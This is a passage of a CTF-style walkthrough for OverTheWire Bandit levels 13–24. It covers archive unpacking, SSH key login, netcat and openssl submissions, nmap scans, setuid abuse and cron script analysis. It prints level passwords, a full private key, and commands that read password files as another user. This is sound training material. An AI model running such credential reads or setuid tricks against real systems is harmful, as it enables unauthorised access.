<p>Hm&hellip; I guess it worked. <strong>bzip2</strong> isn&rsquo;t as picky as <strong>gzip</strong> with the whole file extension thing. It just warned us that it couldn&rsquo;t guess the original name so it just used that one. That&rsquo;s ok for us. Let&rsquo;s use <strong>file</strong> again.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file original.out
original.out: gzip compressed data, was &quot;data4.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
</code></pre>

<p>Ohhh back to gzip. I know this one. We have to change the file extension before decompressing it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ mv original.out original.gz
</code></pre>

<p>Now decompress it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ gzip -d original.gz 
bandit12@bandit:/tmp/dirforfiles$ ls -la
total 1912
drwxr-sr-x     2 bandit12 root    4096 Jun 29 16:21 .
drwxrws-wt 54538 root     root 1925120 Jun 29 16:21 ..
-rw-r-----     1 bandit12 root    2581 Jun 29 16:04 data.txt
-rw-r--r--     1 bandit12 root   20480 Jun 29 16:09 original
</code></pre>

<p>I&rsquo;d say it worked. Let&rsquo;s <strong>file</strong> it again.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file original 
original: POSIX tar archive (GNU)
</code></pre>

<p>Ohhhh that&rsquo;s a new one. Let&rsquo;s check the <strong>man tar</strong> page. To be honest i never know how to use <strong>tar</strong> and <strong>tar</strong> is really powerful (a smart way to say that it has way too many flags and information to read the man page), so let&rsquo;s ask google. I came across <a href="https://www.cyberciti.biz/faq/tar-extract-linux/">this</a>, it&rsquo;s way easier than the <strong>man</strong> page (be smart).</p>

<p>Let&rsquo;s decompress it then.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ tar -xvf original
data5.bin
</code></pre>

<p>That must mean it worked.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ ls -la
total 1924
drwxr-sr-x     2 bandit12 root    4096 Jun 29 16:26 .
drwxrws-wt 54542 root     root 1925120 Jun 29 16:26 ..
-rw-r--r--     1 bandit12 root   10240 Oct 16  2018 data5.bin
-rw-r-----     1 bandit12 root    2581 Jun 29 16:04 data.txt
-rw-r--r--     1 bandit12 root   20480 Jun 29 16:09 original
</code></pre>

<p>Ok now we have a data5.bin file. Let&rsquo;s <strong>file</strong> it. This is starting to get BORING, but we must persist.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file data5.bin 
data5.bin: POSIX tar archive (GNU)
</code></pre>

<p>We got <strong>tar</strong> again. Decompress it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ tar -xvf data5.bin
data6.bin
</code></pre>

<p>By now you should know the steps&hellip;</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file data6.bin 
data6.bin: bzip2 compressed data, block size = 900k
</code></pre>

<p>Good old <strong>bzip2</strong>. Don&rsquo;t stop now, it will be over soon&hellip;</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ bzip2 -d data6.bin
bzip2: Can't guess original name for data6.bin -- using data6.bin.out
</code></pre>

<p>The names are starting to get kind of awful, if you want you can change it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file data6.bin.out 
data6.bin.out: POSIX tar archive (GNU)
</code></pre>

<p>We got <strong>tar</strong> again.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ tar -xvf data6.bin.out
data8.bin
</code></pre>

<p><strong>file</strong> it.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file data8.bin 
data8.bin: gzip compressed data, was &quot;data9.bin&quot;, last modified: Tue Oct 16 12:00:23 2018, max compression, from Unix
</code></pre>

<p>OH MY GOD!! JUST MAKE IT STOP!!! Oh and don&rsquo;t forget <strong>gzip</strong> is the tricky one with the file extension (you&rsquo;re welcome).</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ mv data8.bin data8.gz
bandit12@bandit:/tmp/dirforfiles$ gzip -d data8.gz 
bandit12@bandit:/tmp/dirforfiles$ 
</code></pre>

<p>It worked. Let&rsquo;s see what we have in the folder.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ ls -la
total 1940
drwxr-sr-x     2 bandit12 root    4096 Jun 29 16:33 .
drwxrws-wt 54547 root     root 1925120 Jun 29 16:34 ..
-rw-r--r--     1 bandit12 root   10240 Oct 16  2018 data5.bin
-rw-r--r--     1 bandit12 root   10240 Oct 16  2018 data6.bin.out
-rw-r--r--     1 bandit12 root      49 Oct 16  2018 data8
-rw-r-----     1 bandit12 root    2581 Jun 29 16:04 data.txt
-rw-r--r--     1 bandit12 root   20480 Jun 29 16:09 original
</code></pre>

<p>If you&rsquo;re not sure what is what by now i can&rsquo;t blame you, but we know that the ones with <code>.bin</code> and <code>.bin.out</code> are intermediate files. The one we want is <code>data8</code>.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ file data8
data8: ASCII text
</code></pre>

<p>Finally! This is probably the original file.</p>

<pre><code class="language-bash">bandit12@bandit:/tmp/dirforfiles$ cat data8
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
</code></pre>

<p>It&rsquo;s over. I need a break&hellip;</p>

<h2 id="level-14-http-overthewire-org-wargames-bandit-bandit14-html"><a href="http://overthewire.org/wargames/bandit/bandit14.html">Level 14</a></h2>

<p><a name="level14"></p>

<p>So new level, new challenge. The password is stored in a file but can only be read by the <strong>bandit14</strong> (we are <strong>bandit13</strong>). They give us a SSH key to login to next level though. If whe check the <strong>man</strong> page we learn that we can use the <code>-i</code> flag to use a private key to login. Let&rsquo;s try it.</p>

<pre><code class="language-bash">bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost
(...connection established text...)
bandit14@bandit:~$ 
</code></pre>

<p>Ok we got a prompt as <strong>bandit14</strong>. Have in mind that you&rsquo;re 2 levels deep in ssh connections. Now we can <strong>cat</strong> the password file mentioned previously.</p>

<pre><code class="language-bash">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
</code></pre>

<p>Onto the next one.</p>

<h2 id="level-15-http-overthewire-org-wargames-bandit-bandit15-html"><a href="http://overthewire.org/wargames/bandit/bandit15.html">Level 15</a></h2>

<p><a name="level15"></p>

<p>We can get the password for the next user if we submit the current one toport <strong>30000</strong>. We can use <strong>nc</strong> (netcat) to make simple TCP and UDP connections let&rsquo;s try it. <strong>nc</strong> takes a <strong>host</strong> and a <strong>port</strong> to connect to. Let&rsquo;s try it then.</p>

<pre><code class="language-bash">bandit14@bandit:~$ nc localhost 30000
</code></pre>

<p>Ok now we can write the password.</p>

<pre><code class="language-bash">bandit14@bandit:~$ nc localhost 30000
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
</code></pre>

<p>Next please.</p>

<h2 id="level-16-http-overthewire-org-wargames-bandit-bandit16-html"><a href="http://overthewire.org/wargames/bandit/bandit16.html">Level 16</a></h2>

<p><a name="level16"></p>

<p>This challenge has a few important notes so i&rsquo;ll just paste it here</p>

<blockquote>
<p>The password for the next level can be retrieved by submitting the password of the current level to port <strong>30001</strong> on localhost using <strong>SSL encryption</strong>.</p>

<p>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -ign_eof and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</p>
</blockquote>

<p>So we have a suggested command named openssl and our port is using ssl encryption. Let&rsquo;s check the <strong>man</strong> page.</p>

<p>In the <strong>man</strong> page there is a field named <strong>s_client</strong> which says that implements a generic SSL/TLS client. That should do it. Let&rsquo;s check the <strong>man s_client</strong> page. Ok we can use the <code>-connect</code> flag to insert the address and the port. Let&rsquo;s do it.</p>

<pre><code class="language-bash">bandit15@bandit:~$ openssl s_client -connect localhost:30001
(...bunch of information...)

</code></pre>

<p>Now we can type our current password to get the new one.</p>

<pre><code class="language-bash">bandit15@bandit:~$ openssl s_client -connect localhost:30001
(...bunch of information...)
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd

closed
</code></pre>

<p>Ok we got it. Next one.</p>

<h2 id="level-17-http-overthewire-org-wargames-bandit-bandit17-html"><a href="http://overthewire.org/wargames/bandit/bandit17.html">Level 17</a></h2>

<p><a name="level17"></p>

<p>Now they give us a range of ports to which we have to submit the current password. Let&rsquo;s not bruteforce it. We can use <strong>nmap</strong> to give us some information on the ports. Check the <strong>man</strong> page. We can use the <code>-p</code> flag to scan port ranges.</p>

<pre><code class="language-bash">bandit16@bandit:~$ nmap localhost -p31000-32000

Starting Nmap 7.40 ( https://nmap.org ) at 2019-06-29 17:49 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00021s latency).
Not shown: 999 closed ports
PORT      STATE SERVICE
31518/tcp open  unknown
31790/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
</code></pre>

<p>So we have 2 ports open. Now we can do a service scan in both ports and see the results. To do a service scan we use the <code>-sV</code> flag.</p>

<pre><code class="language-bash">bandit16@bandit:~$ nmap localhost -p T:31518,31790 -sV

Starting Nmap 7.40 ( https://nmap.org ) at 2019-06-29 17:52 CEST
Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 17:54 (0:01:18 remaining)
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 17:54 (0:01:23 remaining)
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
PORT      STATE SERVICE     VERSION
31518/tcp open  ssl/echo
31790/tcp open  ssl/unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31790-TCP:V=7.40%T=SSL%I=7%D=6/29%Time=5D17893D%P=x86_64-pc-linux-g
SF:nu%r(GenericLines,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20cu
SF:rrent\x20password\n&quot;)%r(GetRequest,31,&quot;Wrong!\x20Please\x20enter\x20the
SF:\x20correct\x20current\x20password\n&quot;)%r(HTTPOptions,31,&quot;Wrong!\x20Plea
SF:se\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r(RTSPRequest,
SF:31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\
SF:n&quot;)%r(Help,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x
SF:20password\n&quot;)%r(SSLSessionReq,31,&quot;Wrong!\x20Please\x20enter\x20the\x20
SF:correct\x20current\x20password\n&quot;)%r(TLSSessionReq,31,&quot;Wrong!\x20Please
SF:\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r(Kerberos,31,&quot;W
SF:rong!\x20Please\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r
SF:(FourOhFourRequest,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20c
SF:urrent\x20password\n&quot;)%r(LPDString,31,&quot;Wrong!\x20Please\x20enter\x20the
SF:\x20correct\x20current\x20password\n&quot;)%r(LDAPSearchReq,31,&quot;Wrong!\x20Pl
SF:ease\x20enter\x20the\x20correct\x20current\x20password\n&quot;)%r(SIPOptions
SF:,31,&quot;Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20password
SF:\n&quot;);

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.36 seconds
</code></pre>

<p>(This scan might take a bit)</p>

<p>Ok so both of them speak SSL, but one of them is an <code>echo</code> service as we can see. This was an overkill since we could&rsquo;ve just tried both, but now you know how to do it properly (imagine if you had 300 ports). The port we want is <strong>31790</strong>, lets submit the password using <strong>openssl s_client</strong>.</p>

<pre><code class="language-bash">bandit16@bandit:~$ openssl s_client -connect localhost:31790
(...bunch of ssl information...)
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----

closed
</code></pre>

<p>Now we have an ssh key we can copy it to our own computer to a file and use it to connect like we did in <a href="#level14">Level 14</a>.</p>

<pre><code class="language-bash">myuser@myuser:~$ echo &quot;-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----&quot; &gt; level17_priv

myuser@myuser:~$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i level17_priv
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0664 for 'level17_priv' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key &quot;level17_priv&quot;: bad permissions
bandit17@bandit.labs.overthewire.org's password:
</code></pre>

<p>Hmmm&hellip; It makes sense we shouldn&rsquo;t just have a private key laying around unprotected let&rsquo;s change its permissions (you can google how permissions in linux work).</p>

<pre><code class="language-bash">myuser@myuser:~$ sudo chmod 600 level17_priv
myuser@myuser:~$ ssh bandit17@bandit.labs.overthewire.org -p 2220 -i level17_priv
(...connection established info...)
bandit17@bandit:~$ 
</code></pre>

<p>Success! Just in case we should go get this level&rsquo;s password so we don&rsquo;t need the private key to login. The passwords are located in <code>/etc/bandit_pass/</code>.</p>

<pre><code class="language-bash">bandit17@bandit:~$ cat /etc/bandit_pass/bandit17
xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
</code></pre>

<p>Now we can go to the next one.</p>

<h2 id="level-18-http-overthewire-org-wargames-bandit-bandit18-html"><a href="http://overthewire.org/wargames/bandit/bandit18.html">Level 18</a></h2>

<p><a name="level18"></p>

<p>So now the password for the next level is the only line different between <strong>passwords.old</strong> and <strong>passwords.new</strong>. Let&rsquo;s check the <strong>diff</strong> command.</p>

<pre><code class="language-bash">NAME
       diff - compare files line by line
</code></pre>

<p>This should do it.</p>

<pre><code class="language-bash">bandit17@bandit:~$ diff passwords.old passwords.new 
42c42
&lt; hlbSBPAWJmL6WFDb06gpTx1pPButblOA
---
&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
</code></pre>

<p>So our password should be the one on the bottom since that&rsquo;s the new one. Next one.</p>

<h2 id="level-19-http-overthewire-org-wargames-bandit-bandit19-html"><a href="http://overthewire.org/wargames/bandit/bandit19.html">Level 19</a></h2>

<p><a name="level19"></p>

<p>Now the problem is that once we login we are automatically kicked out</p>

<pre><code class="language-bash">myuser@myuser:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220
(...connection established info...)
Byebye !
Connection to bandit.labs.overthewire.org closed.
myuser@myuser:~$ 
</code></pre>

<p>Hm&hellip; Ok, so what about if we try to run a command through ssh. Instead of opening a connection and get a prompt, just run a command. Well let&rsquo;s check the <strong>man ssh</strong> command</p>

<pre><code class="language-bash">SYNOPSIS
     ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address] [-c cipher_spec] [-D [bind_address:]port] [-E log_file] [-e escape_char]
         [-F configfile] [-I pkcs11] [-i identity_file] [-J destination] [-L address] [-l login_name] [-m mac_spec] [-O ctl_cmd] [-o option]
         [-p port] [-Q query_option] [-R address] [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]] destination [command]
</code></pre>

<p>Well as we can see the last argument of the command is a command so let&rsquo;s try it</p>

<pre><code class="language-bash">myuser@myuser:~$ ssh bandit18@bandit.labs.overthewire.org -p 2220 'cat readme'
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

bandit18@bandit.labs.overthewire.org's password: 
IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
myuser@myuser:~$ 
</code></pre>

<p>So we got kicked out but we were still able to run the command which gave us the password. NICE! Next one.</p>

<h2 id="level-20-http-overthewire-org-wargames-bandit-bandit20-html"><a href="http://overthewire.org/wargames/bandit/bandit20.html">Level 20</a></h2>

<p><a name="level20"></p>

<p>Let&rsquo;s check the challenge description:</p>

<blockquote>
<p>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.</p>
</blockquote>

<p>Let&rsquo;s execute it without arguments then.</p>

<pre><code class="language-bash">bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do id
</code></pre>

<p>We can see which user we are currently running the command by running <strong>whoami</strong></p>

<pre><code class="language-bash">bandit19@bandit:~$ whoami
bandit19
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
</code></pre>

<p>So this runs a command as <strong>bandit20</strong>. It should immediately pop to your mind the idea of just using <strong>cat</strong> to print the password as the next user.</p>

<pre><code class="language-bash">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
</code></pre>

<p>So we ran <strong>cat</strong> as <strong>bandit20</strong> and gave it the file we wanted to print as an argument. This should be easy by now.</p>

<h2 id="level-21-http-overthewire-org-wargames-bandit-bandit21-html"><a href="http://overthewire.org/wargames/bandit/bandit21.html">Level 21</a></h2>

<p><a name="level21"></p>

<p>This challenge is really well detailed in the description so i&rsquo;ll just paste it here</p>

<blockquote>
<p>There is a setuid binary in the homedirectory that does the following: it makes a connection to localhost on the port you specify as a commandline argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).</p>
</blockquote>

<p>So we need to run a server on a port that sends the password everytime someone connects to it. So we will need 2 terminals running because the server will hold on to one of them. We can use <strong>screen</strong>. We just need to execute <strong>screen</strong> which will get us into another empty terminal. To detach the current screen just hit <strong>Ctrl+a d</strong>. Then to resume just execute <strong>screen -r</strong> (RTFM on this one). We will also put a job into background by hitting <strong>Ctrl+z</strong> and then running <strong>fg</strong> to bring it to the foreground.</p>

<pre><code class="language-bash">bandit20@bandit:~$ screen
(...enters a new screen session...)
bandit20@bandit:~$ nc -l -p 30005
(...listening...)
</code></pre>

<p>Now we detach the screen session and run <code>./suconnection 30005</code>.</p>

<pre><code class="language-bash">bandit20@bandit:~$ ./suconnect 30005
(...waiting...)
</code></pre>

<p>Let&rsquo;s go back to our netcat server and send the old password. Hit <strong>Ctrl+z</strong> to send <code>suconnect</code> to the background and then run <strong>screen -r</strong> to resume the screen session.</p>

<pre><code class="language-bash">bandit20@bandit:~$ nc -l -p 30005
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
(...waiting...)
</code></pre>

<p>Ok now finally let&rsquo;s resume our <code>suconnect</code> by exiting screen and running <strong>fg</strong>.</p>

<pre><code class="language-bash">bandit20@bandit:~$ fg
./suconnect 30005
Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
Password matches, sending next password
bandit20@bandit:~$ 
</code></pre>

<p>It worked!! Now we just need to go back to the netcat server to get the password received.</p>

<pre><code class="language-bash">bandit20@bandit:~$ screen -r
(...switched to screen session...)
bandit20@bandit:~$ nc -l -p 30005
GbKksEFF4yrVs6il55v6gwY5aVje5f0j
gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
bandit20@bandit:~$ 
</code></pre>

<p>There we go. DONE! This was interesting! Next one.</p>

<h2 id="level-22-http-overthewire-org-wargames-bandit-bandit22-html"><a href="http://overthewire.org/wargames/bandit/bandit22.html">Level 22</a></h2>

<p><a name="level22"></p>

<p>A program is running periodically using <strong>cron</strong>. Let&rsquo;s look into <code>/etc/cron.d/</code>.</p>

<pre><code class="language-bash">bandit21@bandit:~$ ls -la /etc/cron.d
total 24
drwxr-xr-x  2 root root 4096 Oct 16  2018 .
drwxr-xr-x 88 root root 4096 Oct 16  2018 ..
-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit22
-rw-r--r--  1 root root  122 Oct 16  2018 cronjob_bandit23
-rw-r--r--  1 root root  120 Oct 16  2018 cronjob_bandit24
-rw-r--r--  1 root root  102 Oct  7  2017 .placeholder
</code></pre>

<p>The one that interests us for now is <code>cronjob_bandit22</code>. <strong>cat</strong> it.</p>

<pre><code class="language-bash">bandit21@bandit:~$ cd /etc/cron.d
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
@reboot bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &amp;&gt; /dev/null
</code></pre>

<p>So we may not understand this fully, but let&rsquo;s check that file&rsquo;s content.</p>

<pre><code class="language-bash">bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh 
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
</code></pre>

<p>Ok this we can understand. So it&rsquo;s printing out the password for the next level to that file. Let&rsquo;s see if we can <strong>cat</strong> that file.</p>

<pre><code class="language-bash">bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
</code></pre>

<p>We got it! Next level.</p>

<h2 id="level-23-http-overthewire-org-wargames-bandit-bandit23-html"><a href="http://overthewire.org/wargames/bandit/bandit23.html">Level 23</a></h2>

<p><a name="level23"></p>

<p>This one is pretty much like the previous one but it&rsquo;s a different <strong>cron</strong> job running.</p>

<pre><code class="language-bash">bandit22@bandit:~$ cat /etc/cron.d/cronjob_bandit23
@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &amp;&gt; /dev/null
</code></pre>

<p>So the cronjob is being ran as if it was by user <strong>bandit23</strong>. Let&rsquo;s analyze the file mentioned in here.</p>

<pre><code class="language-bash">bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh 
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo &quot;Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget&quot;

cat /etc/bandit_pass/$myname &gt; /tmp/$mytarget
</code></pre>

<p>So it prints the password to a directory whose name is generated by the command after <code>mytarget</code>. If we execute the command it should give us the name. We just have to replace <code>$myname</code> with <strong>bandit22</strong>, since that would be the output of running <strong>whoami</strong> as we&rsquo;ve mentioned previously.</p>

<pre><code class="language-bash">bandit22@bandit:~$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
</code></pre>

<p>Now if we <strong>cat</strong> this file we should get the password.</p>

<pre><code class="language-bash">bandit22@bandit:~$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
</code></pre>

<p>Done. Onto the next one.</p>

<h2 id="level-24-http-overthewire-org-wargames-bandit-bandit24-html"><a href="http://overthewire.org/wargames/bandit/bandit24.html">Level 24</a></h2>

<p><a name="level24"></p>

<p>Let&rsquo;s see this challenge description since they have a few importante notes:</p>

<blockquote>
<p>A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.</p>

<p>NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!</p>

